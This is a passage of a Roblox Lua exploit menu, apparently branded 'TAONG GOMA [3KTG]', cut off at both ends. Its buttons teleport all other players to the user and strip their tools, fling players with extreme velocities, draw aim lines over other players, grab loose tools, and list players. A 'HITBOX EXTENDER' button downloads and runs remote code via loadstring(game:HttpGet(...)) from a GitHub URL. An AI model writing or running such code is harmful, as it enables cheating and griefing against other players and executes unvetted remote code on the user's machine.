	local rot = CFrame.Angles(0, math.rad(yaw), 0) * CFrame.Angles(math.rad(pitch), 0, 0)
	local localMove = (rot.RightVector * moveDir.X + rot.UpVector * moveDir.Y + rot.LookVector * moveDir.Z)
	local speed = MOVE_SPEED * (sprint and SPRINT_MULTIPLIER or 1)
	local newPos = cam.CFrame.Position + localMove * speed * dt
	cam.CFrame = CFrame.new(newPos) * rot
end)
end)

addMainMenuButton("LOOP BRING ALL [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

--// Variables
local loopEnabled = false
local originalPositions = {}

--// GUI
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 100)
Frame.Position = UDim2.new(0.5, -150, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- all black
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true

local UICorner = Instance.new("UICorner", Frame)
UICorner.CornerRadius = UDim.new(0, 6)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0.4, 0)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 18
Title.Text = "TAONG GOMA LOOP BRING ALL"
Title.TextColor3 = Color3.fromRGB(255, 255, 255) -- white

local StatusButton = Instance.new("TextButton", Frame)
StatusButton.Size = UDim2.new(1, 0, 0.6, 0)
StatusButton.Position = UDim2.new(0, 0, 0.4, 0)
StatusButton.Font = Enum.Font.SourceSansBold
StatusButton.TextSize = 20
StatusButton.Text = "OFF"
StatusButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- black
StatusButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- white text

--// Toggle Function
StatusButton.MouseButton1Click:Connect(function()
    loopEnabled = not loopEnabled

    if loopEnabled then
        -- Save original positions
        originalPositions = {}
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                originalPositions[plr.Name] = plr.Character.HumanoidRootPart.CFrame
            end
        end

        StatusButton.Text = "ON"
        StatusButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- green text
    else
        -- Return players to original positions
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local savedPos = originalPositions[plr.Name]
                if savedPos then
                    plr.Character.HumanoidRootPart.CFrame = savedPos
                end
            end
        end

        StatusButton.Text = "OFF"
        StatusButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- back to white text
    end
end)

--// Loop Bring All in Front
RunService.RenderStepped:Connect(function()
    if loopEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local hrp = LocalPlayer.Character.HumanoidRootPart
        local targetPos = hrp.Position + (hrp.CFrame.LookVector * 5)

        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                -- Remove tools
                plr.Backpack:ClearAllChildren()
                for _, tool in pairs(plr.Character:GetChildren()) do
                    if tool:IsA("Tool") then
                        tool:Destroy()
                    end
                end

                -- Bring to front
                plr.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos)
            end
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("AIM VIEWER [3KTG]", function()
	--// TAONG GOMA AIM VIEWER //--

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

local AimViewerEnabled = false
local playerLines = {}
local lineDistance = 50 -- haba ng line (studs)

-- GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 200, 0, 60)
Frame.Position = UDim2.new(0.4, 0, 0.05, 0)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- black bg
Frame.BorderSizePixel = 2
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 25)
Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- black title bg
Title.Text = "TAONG GOMA AIM VIEWER"
Title.TextColor3 = Color3.fromRGB(255, 255, 255) -- white text
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 18
Title.Parent = Frame

local ToggleButton = Instance.new("TextButton")
ToggleButton.Size = UDim2.new(1, 0, 0, 35)
ToggleButton.Position = UDim2.new(0, 0, 0, 25)
ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- black bg
ToggleButton.Text = "Aim Viewer: OFF"
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- red text (off)
ToggleButton.Font = Enum.Font.SourceSansBold
ToggleButton.TextSize = 18
ToggleButton.Parent = Frame

-- Function para gumawa ng line
local function createLine()
    local line = Drawing.new("Line")
    line.Thickness = 1.5
    line.Transparency = 1
    line.Color = Color3.fromRGB(0, 0, 0) -- black line
    return line
end

-- Toggle function
ToggleButton.MouseButton1Click:Connect(function()
    AimViewerEnabled = not AimViewerEnabled
    if AimViewerEnabled then
        ToggleButton.Text = "Aim Viewer: ON"
        ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- green kapag on
    else
        ToggleButton.Text = "Aim Viewer: OFF"
        ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- red kapag off
        for _, line in pairs(playerLines) do
            line.Visible = false
        end
    end
end)

-- Main loop
RunService.RenderStepped:Connect(function()
    if AimViewerEnabled then
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                if not playerLines[plr] then
                    playerLines[plr] = createLine()
                end
                local line = playerLines[plr]
                local char = plr.Character
                if char and char:FindFirstChild("Head") then
                    local head = char.Head
                    local startPos, onScreen = Camera:WorldToViewportPoint(head.Position)
                    local endPos = head.Position + (head.CFrame.LookVector * lineDistance)
                    local endScreen, onScreen2 = Camera:WorldToViewportPoint(endPos)
                    if onScreen or onScreen2 then
                        line.From = Vector2.new(startPos.X, startPos.Y)
                        line.To = Vector2.new(endScreen.X, endScreen.Y)
                        line.Visible = true
                    else
                        line.Visible = false
                    end
                else
                    line.Visible = false
                end
            end
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("HEAD DETECTOR [3KTG]", function()
	-- Local Anti-Headshot Detection GUI (Client-Side)
-- Detects if someone is aiming at your head
-- With ON/OFF toggle button + Hotkey (G)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

-- SETTINGS
local FOV_THRESHOLD = 5 -- degrees: smaller = stricter
local UPDATE_INTERVAL = 0.2 -- seconds
local detectionEnabled = true -- toggle state

-- ScreenGui Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AntiHeadshotGUI"
ScreenGui.Parent = game.CoreGui

-- Main Frame
local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 200)
Frame.Position = UDim2.new(1, -310, 0, 10)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0

-- Title
local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.Text = "Taong Goma Head Detector"

-- Player List
local PlayerList = Instance.new("TextLabel", Frame)
PlayerList.Size = UDim2.new(1, -10, 1, -40)
PlayerList.Position = UDim2.new(0, 5, 0, 35)
PlayerList.BackgroundTransparency = 1
PlayerList.TextColor3 = Color3.fromRGB(255, 255, 255)
PlayerList.Font = Enum.Font.Code
PlayerList.TextSize = 14
PlayerList.TextXAlignment = Enum.TextXAlignment.Left
PlayerList.TextYAlignment = Enum.TextYAlignment.Top
PlayerList.Text = "No threats detected."
PlayerList.RichText = true

-- Warning Label (Top Center)
local WarningLabel = Instance.new("TextLabel", ScreenGui)
WarningLabel.Size = UDim2.new(1, 0, 0, 30)
WarningLabel.Position = UDim2.new(0, 0, 0, 10)
WarningLabel.BackgroundTransparency = 1
WarningLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
WarningLabel.TextStrokeTransparency = 0
WarningLabel.Font = Enum.Font.GothamBold
WarningLabel.TextSize = 20
WarningLabel.Text = ""
WarningLabel.Visible = false

-- Toggle Button
local ToggleButton = Instance.new("TextButton", Frame)
ToggleButton.Size = UDim2.new(1, 0, 0, 25)
ToggleButton.Position = UDim2.new(0, 0, 1, -25)
ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.Font = Enum.Font.GothamBold
ToggleButton.TextSize = 14
ToggleButton.Text = "Detection: ON"

-- Function to check aim
local function isAimingAtHead(attacker)
    if not attacker.Character or not attacker.Character:FindFirstChild("Head") then return false end
    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("Head") then return false end

    local attackerHead = attacker.Character.Head
    local localHead = LocalPlayer.Character.Head

    local lookDir = attackerHead.CFrame.LookVector
    local dirToOurHead = (localHead.Position - attackerHead.Position).Unit

    local dot = lookDir:Dot(dirToOurHead)
    local angle = math.deg(math.acos(dot))

    return angle <= FOV_THRESHOLD
end

-- Update loop
task.spawn(function()
    while true do
        task.wait(UPDATE_INTERVAL)

        if not detectionEnabled then
            PlayerList.Text = "Detection OFF"
            WarningLabel.Visible = false
            Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            continue
        end

        local threats = {}
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                if isAimingAtHead(plr) then
                    table.insert(threats, plr.Name)
                end
            end
        end

        if #threats > 0 then
            Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            PlayerList.Text = "‚ö† Threats:\n" .. table.concat(threats, "\n")
            WarningLabel.Text = "‚ö† WARNING: " .. table.concat(threats, ", ") .. " aiming at you!"
            WarningLabel.Visible = true
        else
            Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            PlayerList.Text = "No threats detected."
            WarningLabel.Visible = false
        end
    end
end)

-- Toggle function
local function toggleDetection()
    detectionEnabled = not detectionEnabled
    ToggleButton.Text = detectionEnabled and "Detection: ON" or "Detection: OFF"
end

-- Button Click
ToggleButton.MouseButton1Click:Connect(toggleDetection)

-- Hotkey (G)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.G then
        toggleDetection()
    end
end)
end)

addMainMenuButton("TPUNANCHORED TO PLAYER [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local Debris = game:GetService("Debris")

--// GUI Setup
local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
ScreenGui.Name = "UnanchoredToolTP"
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 230)
Frame.Position = UDim2.new(0, 20, 0.5, -115)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Instance.new("UICorner", Frame)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Text = "TAONG GOMA UNANCHORED TP"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.BackgroundTransparency = 1

-- Username Input
local UsernameBox = Instance.new("TextBox", Frame)
UsernameBox.PlaceholderText = "Enter Player Username"
UsernameBox.Size = UDim2.new(1, -20, 0, 30)
UsernameBox.Position = UDim2.new(0, 10, 0, 40)
UsernameBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
UsernameBox.TextColor3 = Color3.new(1, 1, 1)
UsernameBox.Font = Enum.Font.Gotham
UsernameBox.TextSize = 14
UsernameBox.Text = ""
Instance.new("UICorner", UsernameBox)

-- Filter Label
local FilterLabel = Instance.new("TextLabel", Frame)
FilterLabel.Size = UDim2.new(1, -20, 0, 20)
FilterLabel.Position = UDim2.new(0, 10, 0, 80)
FilterLabel.Text = "Tool Filter:"
FilterLabel.TextColor3 = Color3.new(1, 1, 1)
FilterLabel.Font = Enum.Font.Gotham
FilterLabel.TextSize = 13
FilterLabel.BackgroundTransparency = 1

-- Filter Dropdown
local FilterDropdown = Instance.new("TextButton", Frame)
FilterDropdown.Size = UDim2.new(1, -20, 0, 30)
FilterDropdown.Position = UDim2.new(0, 10, 0, 100)
FilterDropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
FilterDropdown.Text = "All Tools"
FilterDropdown.TextColor3 = Color3.new(1, 1, 1)
FilterDropdown.Font = Enum.Font.Gotham
FilterDropdown.TextSize = 13
Instance.new("UICorner", FilterDropdown)

-- Cycle filter options
local filterModes = {"All Tools", "Guns Only", "Melee Only"}
local filterIndex = 1

FilterDropdown.MouseButton1Click:Connect(function()
	filterIndex = filterIndex + 1
	if filterIndex > #filterModes then
		filterIndex = 1
	end
	FilterDropdown.Text = filterModes[filterIndex]
end)

-- Filter logic
local function isToolAllowed(tool)
	local name = tool.Name:lower()

	if filterModes[filterIndex] == "All Tools" then
		return true
	elseif filterModes[filterIndex] == "Guns Only" then
		return name:find("gun") or name:find("pistol") or name:find("UZI") or name:find("silenced pistol") or name:find("desert deagle") or name:find("glock-17") or name:find("glock-19")
	elseif filterModes[filterIndex] == "Melee Only" then
		return name:find("knife") or name:find("bat") or name:find("knife") or name:find("blade") or name:find("crowbar")
	end

	return false
end

-- Main TP (tools fly to player)
local function teleportToolsToPlayer(targetPlayer)
	if not targetPlayer then
		warn("No player specified or player not found.")
		return
	end

	local root = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not root then
		warn("Target player has no HRP")
		return
	end

	for _, v in ipairs(Workspace:GetDescendants()) do
		if v:IsA("Tool") or (v:IsA("BasePart") and v.Name == "Handle") then
			local tool = v:IsA("Tool") and v or v:FindFirstAncestorWhichIsA("Tool")
			if tool and tool:IsDescendantOf(Workspace) and not tool:FindFirstChildOfClass("Humanoid") then
				local handle = tool:FindFirstChild("Handle")
				if handle and not handle.Anchored and isToolAllowed(tool) then
					if handle:FindFirstChild("BodyVelocity") then handle.BodyVelocity:Destroy() end
					local bv = Instance.new("BodyVelocity")
					bv.Velocity = (root.Position - handle.Position).Unit * 100
					bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
					bv.P = 10000
					bv.Parent = handle
					Debris:AddItem(bv, 0.5)
				end
			end
		end
	end
end

-- Grab Tools to Backpack
local function grabToolsToBackpack()
	for _, v in ipairs(Workspace:GetDescendants()) do
		if v:IsA("Tool") and v:FindFirstChild("Handle") and not v.Handle.Anchored and isToolAllowed(v) then
			v.Parent = LocalPlayer.Backpack
		end
	end
end

-- TP Button
local TPButton = Instance.new("TextButton", Frame)
TPButton.Size = UDim2.new(1, -20, 0, 30)
TPButton.Position = UDim2.new(0, 10, 1, -75)
TPButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TPButton.Text = "Teleport Unanchored To Player"
TPButton.TextColor3 = Color3.new(1, 1, 1)
TPButton.Font = Enum.Font.GothamBold
TPButton.TextSize = 13
Instance.new("UICorner", TPButton)

-- Grab Button
local GrabButton = Instance.new("TextButton", Frame)
GrabButton.Size = UDim2.new(1, -20, 0, 30)
GrabButton.Position = UDim2.new(0, 10, 1, -40)
GrabButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
GrabButton.Text = "Grab Tools"
GrabButton.TextColor3 = Color3.new(1, 1, 1)
GrabButton.Font = Enum.Font.GothamBold
GrabButton.TextSize = 13
Instance.new("UICorner", GrabButton)

-- Button Events
TPButton.MouseButton1Click:Connect(function()
	local inputName = UsernameBox.Text
	if inputName == "" then
		warn("No username entered.")
		return
	end

	local targetPlayer = Players:FindFirstChild(inputName)
	if not targetPlayer then
		warn("Player not found: " .. inputName)
		return
	end

	teleportToolsToPlayer(targetPlayer)
end)

GrabButton.MouseButton1Click:Connect(grabToolsToBackpack)
end)

addMainMenuButton("FLING ALL [3KTG]", function()
	game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "Script Executed";
    Text = "Fling All";
    Duration = 6;
})
 
local Targets = {"All"} -- "All", "Target Name", "arian_was_here"
 
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
 
local AllBool = false
 
local GetPlayer = function(Name)
    Name = Name:lower()
    if Name == "all" or Name == "others" then
        AllBool = true
        return
    elseif Name == "random" then
        local GetPlayers = Players:GetPlayers()
        if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
        return GetPlayers[math.random(#GetPlayers)]
    elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
        for _,x in next, Players:GetPlayers() do
            if x ~= Player then
                if x.Name:lower():match("^"..Name) then
                    return x;
                elseif x.DisplayName:lower():match("^"..Name) then
                    return x;
                end
            end
        end
    else
        return
    end
end
 
local Message = function(_Title, _Text, Time)
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
end
 
local SkidFling = function(TargetPlayer)
    local Character = Player.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart
 
    local TCharacter = TargetPlayer.Character
    local THumanoid
    local TRootPart
    local THead
    local Accessory
    local Handle
 
    if TCharacter:FindFirstChildOfClass("Humanoid") then
        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
    end
    if THumanoid and THumanoid.RootPart then
        TRootPart = THumanoid.RootPart
    end
    if TCharacter:FindFirstChild("Head") then
        THead = TCharacter.Head
    end
    if TCharacter:FindFirstChildOfClass("Accessory") then
        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
    end
    if Accessoy and Accessory:FindFirstChild("Handle") then
        Handle = Accessory.Handle
    end
 
    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end
        if THumanoid and THumanoid.Sit and not AllBool then
            return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
        end
        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif not THead and Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        elseif THumanoid and TRootPart then
            workspace.CurrentCamera.CameraSubject = THumanoid
        end
        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
            return
        end
 
        local FPos = function(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end
 
        local SFBasePart = function(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0
 
            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                else
                    break
                end
            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
        end
 
        workspace.FallenPartsDestroyHeight = 0/0
 
        local BV = Instance.new("BodyVelocity")
        BV.Name = "EpixVel"
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
 
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
 
        if TRootPart and THead then
            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                SFBasePart(THead)
            else
                SFBasePart(TRootPart)
            end
        elseif TRootPart and not THead then
            SFBasePart(TRootPart)
        elseif not TRootPart and THead then
            SFBasePart(THead)
        elseif not TRootPart and not THead and Accessory and Handle then
            SFBasePart(Handle)
        else
            return Message("Error Occurred", "Target is missing everything", 5)
        end
 
        BV:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid
 
        repeat
            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
            Humanoid:ChangeState("GettingUp")
            table.foreach(Character:GetChildren(), function(_, x)
                if x:IsA("BasePart") then
                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                end
            end)
            task.wait()
        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
        workspace.FallenPartsDestroyHeight = getgenv().FPDH
    else
        return Message("Error Ocurrido", "El Script A Fallado", 5)
    end
end
 
if not Welcome then Message("By Augus X", "", 6) end
getgenv().Welcome = true
if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
 
if AllBool then
    for _,x in next, Players:GetPlayers() do
        SkidFling(x)
    end
end
 
for _,x in next, Targets do
    if GetPlayer(x) and GetPlayer(x) ~= Player then
        if GetPlayer(x).UserId ~= 2924145477 then
            local TPlayer = GetPlayer(x)
            if TPlayer then
                SkidFling(TPlayer)
            end
        else
            Message("ERROR AL ASER FLING", "", 8)
        end
    elseif not GetPlayer(x) and not AllBool then
        Message("ERROR OCURRIDO", "NO SE LE ISO FLING", 8)
    end
end
end)

addMainMenuButton("HITBOX EXTENDER [3KTG]", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/LisSploit/HitBoxExtender/main/Universal",true))()
end)

--// Function to Add Buttons to Main Menu
local function addMainMenuButton(text, callback)
	local panel = tabPanels["PLAYER MENU"]
	if not panel then return end

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1, -20, 0, 36)
	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	button.TextColor3 = Color3.new(1, 1, 1)
	button.Font = Enum.Font.GothamSemibold
	button.TextSize = 14
	button.Text = text
	button.AutoButtonColor = false
	button.Parent = panel
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)

	button.MouseEnter:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)
	button.MouseLeave:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)

	button.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 4 Buttons in Roleplay Script
addMainMenuButton("PLAYER SCANNER [3KTG]", function()
	--// TAONG GOMA PLAYER SCANNER
-- Solid black GUI + Modern font + Hover effects + Click animations + Working VIEW/UNVIEW/TELEPORT

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UIS = game:GetService("UserInputService")

-- Main ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 350, 0, 400)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BorderSizePixel = 0
MainFrame.Visible = true
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

-- UI Corner
local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 8)
MainCorner.Parent = MainFrame

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "TAONG GOMA PLAYER SCANNER"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.Parent = MainFrame

-- Scan Button
local ScanButton = Instance.new("TextButton")
ScanButton.Size = UDim2.new(0.9, 0, 0, 35)
ScanButton.Position = UDim2.new(0.05, 0, 0, 50)
ScanButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ScanButton.Font = Enum.Font.GothamBold
ScanButton.TextSize = 18
ScanButton.Text = "SCAN"
ScanButton.AutoButtonColor = false
ScanButton.Parent = MainFrame

local ScanCorner = Instance.new("UICorner")
ScanCorner.CornerRadius = UDim.new(0, 6)
ScanCorner.Parent = ScanButton

-- Hover effect
local function AddHoverEffect(button)
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	end)
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	end)
	button.MouseButton1Click:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		task.wait(0.1)
		button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	end)
end
AddHoverEffect(ScanButton)

-- Scrollable Player List
local PlayerListFrame = Instance.new("ScrollingFrame")
PlayerListFrame.Size = UDim2.new(0.9, 0, 0, 280)
PlayerListFrame.Position = UDim2.new(0.05, 0, 0, 90)
PlayerListFrame.BackgroundTransparency = 1
PlayerListFrame.BorderSizePixel = 0
PlayerListFrame.ScrollBarThickness = 6
PlayerListFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
PlayerListFrame.Parent = MainFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = PlayerListFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 4)

-- Function to create each player entry
local function CreatePlayerButton(player)
	local PlayerButton = Instance.new("TextButton")
	PlayerButton.Size = UDim2.new(1, 0, 0, 30)
	PlayerButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	PlayerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	PlayerButton.Font = Enum.Font.Gotham
	PlayerButton.TextSize = 16
	PlayerButton.Text = player.DisplayName .. " (@" .. player.Name .. ")"
	PlayerButton.AutoButtonColor = false
	PlayerButton.Parent = PlayerListFrame

	local PlayerCorner = Instance.new("UICorner")
	PlayerCorner.CornerRadius = UDim.new(0, 6)
	PlayerCorner.Parent = PlayerButton

	AddHoverEffect(PlayerButton)

	-- Actions Frame
	local ActionsFrame = Instance.new("Frame")
	ActionsFrame.Size = UDim2.new(1, 0, 0, 30)
	ActionsFrame.BackgroundTransparency = 1
	ActionsFrame.Visible = false
	ActionsFrame.Parent = PlayerListFrame

	local function CreateActionButton(text)
		local Btn = Instance.new("TextButton")
		Btn.Size = UDim2.new(0.3, 0, 1, 0)
		Btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
		Btn.Font = Enum.Font.GothamBold
		Btn.TextSize = 14
		Btn.Text = text
